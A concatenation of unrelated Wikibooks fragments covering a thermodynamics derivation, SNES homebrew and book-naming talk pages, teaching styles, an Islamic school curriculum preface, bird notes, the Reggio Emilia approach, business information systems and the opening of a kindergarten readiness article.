&lt;math&gt;(\frac{\partial U}{\partial S})_V=T&lt;/math&gt; &lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (15)&lt;br&gt;
and: &lt;br&gt;
&lt;math&gt;(\frac{\partial U}{\partial V})_S=-P&lt;/math&gt; &lt;big&gt; . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .&lt;/big&gt; (16)&lt;br&gt;

At this point it must be stated that the above statement of ‘work involving no entropy’ is not qualitative but is quantitative. Quantum mechanics demands that any rotating mass, molecule or wheel, brings about its quantum states, resulting in a contribution to entropy. This contribution can be calculated with the result that for rotating macroscopic objects it appears to be absolutely negligible. &lt;br&gt;

Starting with the relations (14), (15) and (16) the properties of total differentials can be used to discuss the Carnot cycle, the heat pump, chemical equilibrium and all other relevant topics of thermodynamics, exactly as is done in all textbooks.
In this way the intention of this text has been attained.

== Bengali/Bangla ==

This is the English version of Wikibooks, so shouldn't the language referred to be the English name for it (ie Bengali) rather than the transliteration of the native native name (ie Bangla)? [[User:Rayizmi|Rayizmi]] 20:38, 13 March 2007 (UTC)

Yes, probably, but a new learner should probably begin to learn the native name. Of course, since other such books are named in English, this should probably be called Bengali. --[[User:Henry Dalton|Henry Dalton]] ([[User talk:Henry Dalton|discuss]] • [[Special:Contributions/Henry Dalton|contribs]]) 10:02, 8 March 2012 (UTC)</text>

I'm gonna keep adding a few things on here as I go along.  I'll also work to draw attention to this wikibook.  anyways, a few things that might be good to add:

*Completion of the SuperFX Tutorial
*Tutorials for other expansion chips like the Super Accelerator or DSP
*A full sample ROM that might just be a little 'walk anywhere' project that uses most of the tutorials together, though perhaps not the tutorials for expansion chips.  I'd be more than willing to provide the code for this.

:I can think of a few things:

:*Collection of code snippets?
:*There's been a bunch of work on SPC tools lately. (see [http://ekid.nintendev.com/xms/].) Maybe a tutorial for this spc engine...
:*I'd kinda like to know more about this 65xx text editor you wrote.
:*Needs more of an introduction. (This was sorta high on my todo list.)
:*Mode 7-- including the scaling and rotating of smallish graphics(think clown-coptor).

:BTW, nobody really knows how to program the superfx anymore. There might be some info in the manual, if you can find a copy, but what you'll probably have to do is look at the source code of zsnes and snes9x. Of course, the same goes for the SA-1, DSP, Cx4, etc. --[[User:Snarius|Snarius]] 15:44, 14 April 2007 (UTC)

=Cleanup=
Would like to ask if anyone is willing to work or allow a cleanup of the article, checking links for activity and availability, and if possible sourcing information to this page, so that we do not gradually lose information as time goes by, but gain it- with proper citations, references, and within the guidelines of course.  If one of the linked sites with reference material were to go down, entire areas of data pertaining to SNES specifics could be lost.  Collecting and sorting information, making sure things are in order.  
I also noticed that there were a few dead links- perhaps we could use methods such as waybackmachine to see if we are able to recapture old data that is now lost.  Perhaps we can expand a bit on firmware &amp; hardware, maybe post an example pcb layout for producing a cartridge, some specs to get someone started for actual hardware as well.  I'm sure someone out
there has some really great ideas and wonderful knowledge of these subjects...it IS the SHVC, lots of possibilities!  -- [[User:Aetern142|Aetern142]] ([[User talk:Aetern142|discuss]] • [[Special:Contributions/Aetern142|contribs]]) 08:14, 15 January 2012 (UTC)
:I know what you mean.  This place is a ghost town.  For the longest time I wanted to improve the SNES homebrew dev scene.  There is so just so much more to learn about the SNES, and people are just going &quot;nah, we know everything there is to know.&quot;  I strongly believe homebrewing should be about pushing the system beyond people's expectations of the system.  It's about time for a revival in the the SNES homebrew scene.

=Still Alive?=
Is there anyone still interested on working on this?  --[[User:PhaZ-90771|PhaZ-90771]] ([[User talk:PhaZ-90771|discuss]] • [[Special:Contributions/PhaZ-90771|contribs]]) 23:34, 29 November 2013 (UTC)</text>

      <text xml:space="preserve">{{hiddenh3|What teaching styles can educators employ?}}

Style in teaching is more than a superficial collection of interesting mannerisms used to create an impression; it is best viewed as a persuasive quality that plays an important role in several aspects of teaching. Personal qualities can direct and guide the selection of instructional processes. Just as each student has their own individual learning styles, teachers have certain teaching styles that work best for them. It is important to be aware of your personal preferences when creating and delivering lesson plans. However, one must not limit themselves to one particular style of teaching because not every student learns the same way. It is a number one priority to keep the students in mind when thinking of ideas for your classroom.(''Michigan State University Board of Trustees 2007'')

== Background Information ==
There is a symbiotic relationship among our personal qualities, the instructional processes we employ to convey the content and the styles our students display as learners. It is proven by research that most teachers teach the way they were taught. It is a good idea to first put yourself in the student’s position, so you are aware of the students’ capability of understanding the material at hand. Typically these teachers are field independent, meaning they are more content oriented and prefer to use more formal teaching methods favoring less student involvement and more structured activities in the classroom. Research also supports the view that if students learning preference matches the teachers teaching style the student will be more motivated to achieve their learning goals (''Miller 2001'').

==Teaching Styles==
=== Formal Authority ===
Many of the different teaching styles include formal authority, demonstrator or personal model, facilitator and delegator. Teachers who use the formal authority teaching style focus mainly on content. Formal authority is teacher centered where the teacher is responsible for controlling and providing the amount of content and how the student is expected to receive and interpret the content. This form of teaching style is not concerned with building relationships with their students nor is it important that their students form relationships with other students. One negative aspect of this form of teaching style is that it does not require much student participation in class; this can cause the student to loose interest in the course material, thus leading to sleeping in class or not attending the class at all. However, this teaching style may work better with students who become frustrated when facing new challenges that aren’t explained, or with students who like to compete with peers for classrom rewards.(''Jennifer Stein, Linda Steeves, and Christine Simth-Mitsuhashi 2001'')

===Demonstrator===
Teachers who like their classroom to be more interactive would choose the demonstrator or personal model teaching style, which tends to be teacher-centered with emphasis on demonstration and modeling. This type of teacher is perceived as a role model by demonstrating skills, thus, helping students develop and apply these skills and knowledge. It is important that students can independently solve similar problems by using and adapting demonstrated methods. Teachers that use this style of teaching are interested in encouraging student participation and adapting their presentation to include various learning styles. Students should take some responsibility for learning course material as well as asking for help when they don’t understand the content. This style works best with students who enjoy working with their peers as well as others who may become easily frustrated.

===Facilitator===
Teachers who use the facilitator style of teaching focus on activities conducted in the classroom. This style of teaching emphasizes student-centered learning placing more responsibility on the student for meeting the demands of various learning tasks. The facilitative style of teaching is best for students who are independent learners and who are willing to actively participate and collaborate with their peers in or outside of the classroom. Facilitative teaching is also designed for group activities which are used to necessitate active learning, problem solving, and student to student interaction. This method was designed to provide activities which require student processing and application of course content in an original and creative manner. However, it may become difficult for students who have an aggressive behavior to succeed when being taught with this teaching method.

===Delegator===
Teacher who use delegator teaching style place control and responsibility for learning on individual or groups of students. A delegative teacher is one who always gives the students' a choice to implement their own complex learning projects. These particular students will often have to work independently or in groups and it is necessary for them to maintain motivation and focus. The goal of delegative teaching style is to teach students more than just course material such as making them be effective in group effort and be able to manage interpersonal relationships. Students who are taught by the delegative teaching method will be able to retain more information and use the critical thinking process to manage daily tasks or projects.

      <text xml:space="preserve">Islamic Education Approach &amp; Method

We live in the United States of America. American society is socially mixed and culturally diverse. This is a fact which could mean different things to different people. From religious and educational point of view, this has both its advantages and disadvantages. The advantages include the exposure of our children to different cultures and value-systems, communication with people of diverse beliefs and inclinations, relatively high standards of education, availability of educational facilities and fairly well opportunities to enhance and develop creativity.
&lt;p&gt;
But these advantages are not risk free. Muslim students have to deal inevitably with rather constant contradictions between the principles they believe in and values they cherish by witnessing manifestations of disbelief and counter-values in the society. While we teach our students how to dress, what to eat and not to eat, where to go and where not to go, what kind of friends to choose, what manners to learn, and what understanding of religion to grasp, we have to deal with the fact that they live in a society where they see women improperly dressed; people eat and drink religiously forbidden things; the young go wherever their desires take them to; individuals choose friends regardless of religious and moral limits; they get ego-centric and self-serving habits; and many perceive religion as an old-fashion set of rules which has little to do with the realities of their lives.
&lt;p&gt;
Exposure to different and sometimes contradictory lifestyles stemming from diverse value-systems is inevitable. The question is how to establish a sense of identity for our young children so that it would firmly associate them with Islamic ideas and ideals and prevent their absorption into the prevailing alien cultures and life-styles.
&lt;p&gt;
In order to effectively deal with this question, a new approach has to be adopted. The approach adopted in the present collection is to show the relevance of Islamic teachings to the daily life of the students. To introduce Islam in a meaningful sense to the students of the elementary, middle and high schools in the United States is a formidable task. This requires relevance and consistency: relevance to the actual life, and consistency in planning, modeling and training.
&lt;p&gt;
It is recognized that a comprehensive program in Islamic teachings has to include information on the principles of faith, history of  Muslims, practical laws and rituals and last but not least, ethical and moral values. This collection contains readings and materials and programs on all these four categories. Selected topics from each category are thoroughly scaled and sorted in a gradual and developmental fashion. In this manner, certain key concepts and topics are recurrently dealt with, in different grades commensurate to their level of understanding.
&lt;p&gt;
		Apart from the substance and the structure of the curriculum, however, the delicacy of the issue lies in the challenge to get the fine message of Islam through the students’ minds and hearts while making it pleasant and attractive for them. My recent experience in Razi School, along with my background in Islamic educational programs for children and the youth over the years, have convinced me that this challenge would not be met unless due attention is paid to three core values: cleanliness, dignity and vision. To use Islamic vocabulary these should be translated as: al-Taharah, al-Izzah and al-Basirah. These concepts need a brief elaboration.
&lt;p&gt;
Firstly, the religion curriculum begins with a discussion about cleanliness in body, dress and spirit. We teach students that as a Muslim they should observe and practice cleanliness not only in their appearance but also in their words and deeds. Through this window we teach them the requirements of religious cleanliness for prayer and otherwise. The objective is to clarify, relate and emphasize the principle of cleanliness and the value of spiritual purity in their progressive and comprehensive meanings as an ultimate goal in the Islamic lifestyle.
&lt;p&gt;
Secondly, the emphasis has been on the importance of having thoughtful and respectful characters. The ultimate goal in any Islamic school should be building up Muslim characters: respective and respected boys and girls who care for their inner beliefs and outer conducts. A respectful personality is unlikely to surrender to the humiliation of disgrace or to the temptation of a sin.
&lt;p&gt;
 	Thirdly, assistance should be provided for students to increase their awareness and vigilance with respect to the society they live in. In particular, higher-grade students should be guided to observe, think, compare, interact and criticize their environment. We want to equip them with an Islamic vision so that they would realize that they belong to the Islamic Ummah and Islamic civilization. They should be raised knowing that their parents and teachers await fulfillment of certain expectations by them. Such a vision, would secure them from the dangers on their ways ahead.
&lt;p&gt;
To strive toward materializing these core values in their deep and multi-layer meanings is the key in constructing a fruitful and effective Islamic school.
&lt;p&gt;
Instead of stressing a rigid face of Islamic laws and rituals, the method adopted here underscores the appealing message of Islamic moral code and ethical conduct. We see this as the main entrance to understanding Islam. Through numerous stories, movies, essays, homework and classroom discussions, students are urged and encouraged to put their faith in action. Indeed one of the major themes in this curriculum, especially for the higher graders, is to increase their awareness towards the Islamic environment of their school and beyond. Many issues such as cleanliness at school, criteria for a healthy and Islamic friendship, how to correct each other’s mistakes, etc. are discussed and pointed out. A number of these subjects could constitute topics for students’ projects and extra-curricular activities.
&lt;p&gt;
A model Islamic school should be characterized by a cordial environment in which students would learn how to care about their Islamic manners and behavior. Muslims from different countries of origin have many things in common. Our children should understand and respect each other. They should care more about commonalities among Muslims than their differences. This attitude should find a vivid reflection in close and cordial relationship amongst students and teachers. Let us work hard to further strengthen in our students this sense of unity. Let us make sure that we do not divert their attention from the larger picture to the minute and divisive differences which have divided us for centuries.
&lt;p&gt;
The present collection is but a humble endeavor towards developing a curriculum for Islamic education based on the above approach and method. Through my close examination of numerous books, articles, booklets, audio-videos and other materials available in English for Islamic education, I have selected the best and the most appropriate to serve the goals and objectives outlined above. I understand that this is just the beginning of a long journey and I do appreciate works of others in the field.
&lt;p&gt;
Nevertheless, I am convinced that this curriculum is outstanding and unparalleled in many respects due to its approach, method, as well as its contents. While most of the materials collected in this curriculum are selected from valuable works of others, some ideas and training instruments, such as those on cleanliness, eating and asking manners, have originally been developed for this curriculum and are thus unique and unprecedented. In some instances certain changes and modifications have been made in the selected materials for the sake of consistency, coherence and relevance to Islamic education.
&lt;p&gt;
I would like to conclude by pointing out that I deeply adhere to the belief that all Muslims are in this together. Let us work together and help each other. Let us open our hearts to the guidance of the Holy Qur’an where it enjoins: hold fast all together by the rope of Allah and be not divided among yourselves.

| description = The Northern Mockingbird builds a twig nest in a dense shrub or tree, which it aggressively defends against other birds and animals, including humans. When a predator is persistent, Mockingbirds from neighboring territories, summoned by a distinct call, may join the attack. Other birds may gather to watch as the Mockingbirds harass the intruder.  This bird is mainly a permanent resident, but northern birds may move south during harsh weather.  Mockingbirds have a strong preference for certain trees such as maple, sweetgum, and sycamore. They generally avoid pine trees after the other trees have grown their leaves. Also, they have a particular preference for high places, such as the topmost branches of trees.  Although many species of bird imitate other birds, the Northern Mockingbird is the best known in North America for doing so. It not only imitates birds but also other animals and mechanical sounds.

Carolina Chickadees are so similar to Black-capped Chickadees that they themselves have trouble telling their species apart. Because of this they sometimes mate producing hybrids. The most obvious difference between the three chickadees is that the Carolina Chickadee sings four-note song, Black-capped ones sing two-note songs, and the hybrids sing three-note songs.  The song of the Black-capped is a simple, clear whistle of two notes, identical in rhythm, the first roughly a whole-step below the second. This is distinguished from the Carolina chickadee's four-note call ''fee-bee fee-bay''; the lower notes are nearly identical but the higher ''fee'' notes are omitted, making the Black-capped song like ''bee bay''.

      <text xml:space="preserve">'''The Reggio Emilia Approach to Early Childhood Education'''
 
Erin Riddle

=='''Introduction'''==
''Imagine, for a moment, that you have been sent to Italy to student teach.  You arrive at the early childhood center that you have been assigned and observe the following.  Inside the building there are floor to ceiling windows and plants that blur the boundaries between outside and in (Tarr, 2001).  Lights and shadows fluctuate across the floor.  The school is designed around a piazza that reflects the central piazzas of the Italian city.  You discover that this space (the piazza) serves as a gathering place for children from all classes and a comfortable meeting place for teachers and parents.  This piazza also offers a store, with access to real vegetables.  Nearby you see an area filled with fancy dress up clothes that invite investigation and a kaleidoscope large enough to hold many children (Tarr, 2001).  As you continue your walk through the building, you observe beautiful vases of fresh flowers, and linen tablecloths on tables with real dishes.  In some classrooms there are dried flowers hanging from the ceiling.  You notice displays of both living and dried plants all over the building.  Attractive jars of beans, shells, pebbles, and seeds are displayed on shelves in the dinning area of the infant toddler center.  Manufactured as well as natural materials available for art projects are displayed carefully in transparent containers (Tarr, 2001).  Many objects are set on or in front of mirrors to provide multiple views from the children’s’ perspective.  Mini art studios are placed adjacent to every classroom.  On the walls of every classroom are clearly visible words and photographs of children working on past projects along with previews of current ones.  The artwork that you observe is detailed, complex, and beyond that usually expected of 4 and 5 year-old children.  The children’s work is not just on display, but it is everywhere and it is an integral part of the environment, greeting you as you enter, dividing the environmental space, covering windows, and enhancing the outside yard (Finegan, 2001).  This vision is a Reggio Emilia school.  It is one out of approximately 33 Reggio Emilia preschools and infant-toddler centers located in the surrounding cities. '' 

=='''Background'''==
Loris Malaguzzi was the founder of the Reggio Emilia approach.  He lived from 1920 to 1994.  He was a teacher in Italy who was trained in education and psychology.  In a little town called Villa Cella in the northern region of Italy known as Regio Ramana, Malaguzzi found inspiration.  In 1946, he witnessed villagers, including children and parents collecting stone, sand and timber to build a school.  This was during a time of political and economic chaos that followed the fall of Fascism and the German retreat from Italy (Scholastic, 2001).  He was so impressed by what he saw that day, that he stayed there and worked a side those dedicated parents in developing what would become one of the first Reggio Emilia schools.   Loris Malaguzzi was an educator, who enveloped a unique vision of early childhood education for his time, founded the Reggio Emilia school and remained the director until 1985. The Reggio schools are not private schools, but city run centers initiated by parents after World War II (Schiller, 1995).  As of 1990, there were 33 preschools and infant-toddler centers in the surrounding cities of Italy. The structure of the infant-toddler center includes: the ''Asilo nido'' “nest” for children ages birth to three years, and two classroom teachers.  The preschool is called ''scuola materna'' “maternal school” and is set up for a maximum of 25 children, ages 3-6, with two teachers in each classroom.

=='''Reggio Philosophy'''==
The philosophy that drives the Reggio Emilia schools reflects a theoretical kinship with Bruner, Dewey, Piaget, and Vygotsky (Finegan, 2001).  Much of what occurs in Reggio Emilia classrooms resembles a constructivist approach to early childhood education.  The image that Reggio Emilia educators have of the child guides much of their philosophy. This image of the child includes seeing him as strong, competent, capable of constructing his own thoughts, and having great potential to offer the world (Hendrick, 2001).   Reggio educators believe that learning is spiral not linear, and the physical environment creates beauty and supports open-ended teaching and learning (Schiller, 1995).  Also, there is a great concern for what the environment is teaching.  The environment itself becomes the “third” teacher in addition to the two classroom teachers.  Reggian educators belief that children have a right to environments that support the development of their many languages (Tarr, 2001).  Further embedded in the Reggio Emilia philosophy is the notion that children’s interactions and relationships with other children and adults are a vital component of learning (Schiller, 1995).  

=='''Reggio Curriculum'''==
Together, parents, teachers, community members, and a pedagogist design the curriculum, which continues to emerge as the children learn and grow.  Teachers facilitate the exploration of themes, inspired by the children’s curiosity, through the use of a project approach, which may last from a day to a week to a year (Finegan, 2001).  Despite the broad curriculum goal that the teacher may have in mind, the curriculum also follows the lead and interests of the children.  A large part of the exploring, learning, and understanding of ideas is done through artwork.  The Reggio approach does not teach art as a subject, but as a language for children to express understanding of their environment (Schiller, 1995).  It is the art studio (called ''atelier'') that becomes a place of research into what children know and understand. There is a visual art specialist, (called an ''artierlista'') employed full-time at each Reggio center to guide children into appropriate media choices to complete their ideas and projects. Media choices available to students may include paint, clay, cardboard structures, bent wire adorned with tissue paper or dramatization such as shadow plays, to express what they understand.  It is through this wide variety of artwork that students communicate the language of what they know. 

 “What children learn does not follow as automatic result from 
 what is taught. Rather, it is in large part due to the children’s 
 own doing as a consequence of their activities and our resources”.
 --Loris Malaguzzi 

A major focus of the Reggio program is observation and documentation.  Documentation is done through tape recordings, written notes or video.  Teachers routinely take notes and photographs and make tape recordings of group discussions and children’s play (Scholastic, 1982).  The teachers meet each week to focus on their observations.  Teachers and directors review the documentation and strive to hear the strongest currents of interest within the children’s flow of ideas (Scholastic, 1992). Then the teachers use what they learn to plan activities that are truly based on children’s interests and to gain insights into the individual personalities of the child.  Teachers select an aspect of the children’s interests to develop further, one that presents a problem for them to consider and solve (or, as Reggian teacher’s put it, “provokes” the child into thought), (Hendricks, 2001).  Photos are taken to document the learning process as the project evolves.  Teachers develop panels, which include the pictures and words of children engaged in their area of discovery.  These panels, set around the space of the school, help children remember prior learning and show parents the learning which children are experiencing. Throughout the process teachers and children interact by listening and talking to each other to explore subjects by exchanging ideas and trying out those ideas.  The results of these joint investigations are then converted by the children into visible products that communicate what they have found out to other people.

=='''Role of Teachers &amp; Parents'''==
The teacher is the facilitator of the child’s learning.  The children and teachers are equally involved in the progress of the work and the ideas being explored (Schiller, 1995).  As a facilitator the teacher helps the child reach the next level of understanding.  The teacher is not the dispenser of knowledge, but rather helps the child to discover his or her own learning.  

The Reggio Emilia approach recognizes parents as valuable partners in the learning experience of the young.  Parents are involved to help teachers learn about their child.  Parent input includes participation in curriculum development, in program planning, evaluations of both child and school, and in the broader arena of advocacy and policy decisions (New, 2003).  Parents are perceived as competent and rightful contributors to the school program in which a child spends his or her time (New, 2003). 

=='''The Significance of Reggio'''==
The Italian culture demonstrates a profound respect for children—and for childhood—and the way in which it is put into educational practice in the preschools of Reggio Emilia has captured the minds of American educators (Linn, 2001). For all children, both the process and the products of their learning are taken seriously, giving a dignity to children’s work that is often lacking in American preschools (Linn, 2001).  The Reggio Emilia schools of Italy raise awareness about to connections between culture and educational practices that are different than our own.  Many educators and researchers have visited Italy to observe this approach firsthand and have conducted research and written about what U.S. educators can learn from this approach (Finegan, 2001).  Preschools in the United States already embrace many ideas basic to the Reggian philosophy: parent involvement, fostering creativity, child-centered, hands-on, and cooperative learning (Hendericks, 2001).  The term “Reggio inspired” is often used in education to depict U.S. programs that have embraced specific aspects of the Reggio Emilia philosophy.

==Essay Question==
'''What are some differences between preschools in the United States and the Reggio schools of Italy?  Will these differences alter your own educational practices?'''

Essay Answer:
There are many differences between U.S. preschools and those discussed in Italy.  In the U.S. preschools are decorated in bright primary colors with cartoonish simplified decorations.   But Reggio schools utilize real objects that are both beautiful and complex.  Where Reggio schools are open to a piazza, early childhood centers here are closed in with walls.   We are accustomed to artwork made at preschool that can typically stick to a refrigerator door, but artwork in a Reggio school is often three-dimensional.  Teachers in the U.S. consider themselves dispensers of knowledge and children vessels who need to be filled.  However, Reggio teachers view themselves more as facilitators who believe that children are empowered with their own knowledge that simply needs discovering.  Currently, the U.S. educational system is a test driven system, with standardized tests being the tool use to measure success and knowledge.  But the Italian educational system is not test driven, and teachers in Reggio schools and probably other schools as well, assess children in different ways (including long term projects).  The differences between our culture and that of Italy are very complex and affect every inch of society, not just schools.  One very important difference, that is more of a societal issue, has to do with the relationship between teachers and parents.  In many U.S. schools, parents are not largely committed to consistent daily collaboration with teachers that alters the design of the curriculum. There is not always a strong connect between community, parents and schools.  While we try to improve this relationship, our culture as a whole does not value the relationship in the unique way, that we see practiced in Italy. So it may be difficult to implement the philosophy fully. There are some practices that I do see continuing in my own classroom that may have their origins in Reggio Emilia.  The importance of listening to what others say and observing how children learn best can be used for teacher reflection and adaption of lesson plans. In addition, the use of project oriented learning, constructing knowledge and inquiry based/discovery lessons are important methods of teaching to me.

      <text xml:space="preserve">==DSS Decision Support System==

A computer based information system that provides a flexible tool for an analysis and helps managers focus on the future. It takes all kinds of data from all different places and gathers it in a way that humans can understand it.

'''Features'''
'''Inputs or Outputs'''- input includes internal data, ie- prossed transaction data.  Output are demand reports on which a top manager can make a dicision about problems.

'''Tactical Managers'''- used to assist tactical level manager in making tactical decisions.

'''Produces Analytic models'''- this is a key attribut to the DSS as it uses models.

'''Uses''' 

Dss are developed to support the types of decision faces by managers in specific indistries, ie- airline and real estate. American Airlines produced a DSS that helps to decide how much to over book and how to set prices for each seat so that a plane is filled and profits are maximized.


===DSS Applications Development===
About 1980, people started the activities that related to expanding DSS applications. Those actions expanded the decision support systems which beyond the management and business application domain. These diverse systems called Decision Support Systems(DSS). During those days, people recognized that DSS could be used to support decision-makers at any level and in an organization. As well, it could support operations decision making, strategic decision-making and financial management.

      <text xml:space="preserve">====What is TPS====
TPS stands for ''transaction processing systems''.  TPS is defined as '''&quot;a computer - based information system that keeps track of the transactions needed to conduct business&quot;''' (Using Information &amp; Technology p436).

====Features of a TPS====
Rapid Response

Fast performance with a rapid response time is critical. Businesses cannot afford to have customers waiting for a TPS to respond, the turnaround time from the input of the transaction to the production for the output must be a few seconds or less.

Reliability

Many organisations rely heavily on their TPS; a breakdown will disrupt operations or even stop the business. For a TPS to be effective its failure rate must be very low. If a TPS does fail, then quick and accurate recovery must be possible. This makes well–designed backup and recovery procedures essential.
Inflexibility

A TPS wants every transaction to be processed in the same way regardless of the user, the customer or the time for day. If a TPS were flexible, there would be too many opportunities for non-standard operations, for example, a commercial airline needs to consistently accept airline reservations from a range of travel agents, accepting different transactions data from different travel agents would be a problem.
Controlled processing

The processing in a TPS must support an organisation's operations. For example if an organisation allocates roles and responsibilities to particular employees, then the TPS should enforce and maintain this requirement.

=====Input and output=====
The inputs of a system are transaction data: bills, orders,inventory levels, and the like. The output consists of processed transactions: bills, paychecks.

=====For Operational Managers=====


::The TPS deals with day-to-day matters, it is principally of use to operational-level or supervisory managers, although it can also be helpful to tactical-level managers.

=====Produces detail reports=====


=====One TPS for each department=====


=====Basis for MIS and DSS=====
MIS: management information systems, a database designed to aid in management decisions and overall directions of the businesses.

DSS: decision support system, also a data base created for business decisions. 
--&gt; The purpose for having two of such systems is to be redundant and hopefully build upon each others responses to a grand question.

====Order Entry Systems====
This type of system records and manages order processing. This doesn't necessarily need to be on a computer, it can be in person, through the mail or even on the phone which means there are plenty of types of these systems. The more familiar types are [[The_Computer_Revolution/E_commerce/Electronic_Financial_Transactions|e-commerce systems]] and point-of-sale systems (POS). More and more stores have been using a new form of POS called a MPOS or mobile-point-of-sale. You may have noticed that when you enter an [http://store.apple.com/us Apple Store] you can't find a cashier station. This is because they are using a MPOS and have been. The trend has been spreading to some retail stores as well. [http://www.urbanoutfitters.com/urban/index.jsp Urban Outfitters] has recently introduced this in their stores just before the winter holidays hit in 2011. This trend has been growing not to eliminate the registers but to provide relief for long lines during peak times when there are only a limited amount of registers available. The only downfall this system has is that it is not possible to handle cash due to security.

      <text xml:space="preserve">===definition===

The managment information system was designed to provide timely and effective information to support planning and control of managment. The MIS system is used to make decisions, solve problems, supervise activities, and track progress. Information requirements are predefined for structured decisions. This system generates three different types of information:
   ''' 1. Detailed information''' 
       Confirms transaction processing activities
    '''2. Summary information'''
       Consolidates data into a format that an individual can review quickly and easily
   ''' 3. Exception information'''
       Filters data to report information that is outside of a normal condition

===Benefits of MIS===

*easy record keeping
*rapid report generation
*simple integration
*information management
*Sophisticated Security
*expanded E-commerce
*Maximize consistent information retrieval and reporting 
*Increase workforce productivity 
*Improve system response times and availability 
*Enhance system maintainability
*help managers make better decisions
*improve project management, risk management, estimation, requirements management, supplier agreement management, measurement and analysis, quality assurance, configuration  management, process definition, peer reviews and testing.

These benefits above are achievable with the right tools and personnel that has in-depth knowledge of human and organizational issues surrounding computer use such as:

*Designing computer systems for maximum usability and human productivity 
*Interpersonal communication using computers 
*Conducting and tracking business transactions with computers 
*Supporting teamwork via computers 
*Using computers to improve decisions 
*Managing organizational knowledge

===Background===

Management information systems do not have to be computerized, but with today's large, multinational corporations, computerization is a must for a business to be successful. However, management information systems began with simple manual systems such as customer databases on index cards. As early as 1642, the French mathematician and philosopher Blaise Pascal invented the first mechanical adding machine so that figures could be added to provide information. Almost two hundred years later, Charles Babbage, a professor of mathematics at Cambridge University in England, wanted to make a machine that would compute mathematical tables. He attempted to build a computing machine during the 1880s. He failed because his ideas were beyond his technical capabilities, not because the idea was flawed. Babbage is often called the father of the computer. With the advent of the computer, management information systems became automated.

In the late 1890s, because of the efforts of Herman Hollerith, who created a punch-card system to tabulate the data for the 1890 census, it was possible to begin to provide data-processing equipment. The punch card developed by Hollerith was later used to form a company to provide data-processing equipment. This company evolved into International Business Machines (IBM). Mainframe computers were used for management information systems from the 1940s, 50s, 60s, and up until the 1970s. In the 1970s, personal computers were first built by hobbyists. Then Apple computer developed one of the first practical personal computers. In the early 1980s, IBM developed its PC, and since then, the personal computer industry has mush roomed. Almost every management information system revolves around some kind of computer hardware and software.

Management information systems are be coming more important, and MIS personnel are more visible than in the 1960s and 1970s, when they were hidden away from the rest of the company and performed tasks behind closed doors. So remote were some MIS personnel from the operations of the business that they did not even know what products their companies made. This has changed because the need for an effective management information system is of primary concern to the business organization. Managers use MIS operations for all phases of management, including planning, organizing, directing, and controlling.

===Type of MIS System===

One type of MIS System to help track transactions and detailed reports is [http://na.sage.com/sage-300-trade-specialty/ ''Sage 300 Trade Specialty'']. This system provides accounting, service management, procurement, estimating, and detailed reporting of all departments to analyze entire business activity. A company can monitor their financial status based on Sage’s ability to track with a purchase order system that integrates with the accounting function to bill and pay invoices. This system even allows an estimating module that can allow the company to monitor their profitability of a given project, again which integrates with the accounting function of the software to provide detailed summaries of a company’s profitability and revenue.

Office Information Systems (OIS) are used in virtually every area of business for a variety of purposes.  Microsoft Office and OpenOffice.org are OIS that are widely used in business from the small entrepreneur to the large bureaucratic organizations. 

====Microsoft Word====
Microsoft word is a component of the Microsoft Office system; however, it is also sold as a standalone product or included in Microsoft Works Suite. Beginning with the 2003 version, the branding was revised to emphasize Word's identity as a component within the Office suite: Microsoft began calling it Microsoft Office Word instead of merely Microsoft Word.

Microsoft Office Word helps create and share their professional-looking content by combining a comprehensive set of writing tools with an easy to use interface.

      <text xml:space="preserve">==ESS==
It is a specialized DSS that includes all the hardware, software, data, procedures, and people used to assist senior levels, executives  within the organization. 

Executive Support System (ESS) is a reporting tool (software) that allows you to turn your organization's data into useful summarized reports. These reports are generally used by executive level managers for quick access to reports coming from all company levels and departments such as billing, cost accounting , staffing, scheduling, and more.

In addition to providing quick access to organized data from departments, some Executive Support System tools also provide analysis tools that predicts a series of performance outcomes over time using the input data. This type of ESS is useful to executives as it provides possible outcomes and quick reference to statistics and numbers needed for decision-making.

The exact reporting tools and outcome of an Executive Support System completely depends on the ESS developer and it's intended industry use. For example, Cambridge Systematics has ESS to support the investment planning process for the Ministry of Transportation. The features and functions of this Executive Support System are entirely different from the Executive Support System developed by Meditech, which is useful to health care organizations.

Several companies offer pre-designed Executive Support System packages (usually suited to one particular industry), while others offer packages which can be customized your organization's needs.


There are only a few different types of software systems that support the ESS:

* Cambridge Systematics Executive Support System
* MEDITECH Executive Support System

&lt;u&gt;'''Geographic Information Systems (GISs)'''&lt;/u&gt;


[[File:Digitizing errors.svg|100px|thumb|Add Topological and Digital errors in GISs]]

A geographic Information system (GIS) is an information system that combines geographic information such as maps and terrain data with other types of data such as information about customers, sales, population, income, in order to provide a better understanding of the relationships between the data. GISs are commonly used to make a variety of decisions that involve locations, such as finding the best location for a new store, analyzing the flood or tornado risk for a particular home or a neighborhood developing regional marketing plans, or detecting crime patterns for specific geographic locations. Visualizing a new store on a map, along with the data representing other factors such as traffic, population, weather, housing prices, household income, crime statistics, and also environmental concerns like wetlands or protected species that might hamper construction can help a manager select the optimal location.

GISs are also an essential component of emergency response and disaster relief systems. In 2005, first two weeks after Hurricane Katrina hit the Gulf coast, 60 volunteer GIS experts used GISs to assist in the rescue and disaster relief efforts. They used GISs to build search maps for rescue workers to translate street addresses of survivors requiring helicopter rescues into map coordinates for the helicopter pilots, and to create maps for various issues like electrical power had not been restored in those areas. GIS helps you answer questions and solve problems by looking at your data in a way that is quickly understood and easily shared. GIS technology can be integrated into any enterprise information system framework.</text>

'''A Glance into What Kindergarten Readiness Really Means'''


By

Bonnie Hoskins




=='''Introduction'''==

	Getting ready to start school can be a stressful experience for any student, but it can be even more stressful for kindergarteners going for the first time!  Likewise, parents and educators are burdened with the responsibility of deciding if the student is ready for kindergarten or not.  The issue of kindergarten readiness has always been an issue; now, it is receiving more focus than ever.  Some of the issues surrounding kindergarten readiness include: what determines if a student is ready (should it be age or other skills), what qualities must a student already possess before entering kindergarten, and who should get to make the discussion of whether or not a student is ready to attend—parents or educators?  These and other issues surrounding kindergarten readiness will be expressed in the following article.
   
=='''Background'''==

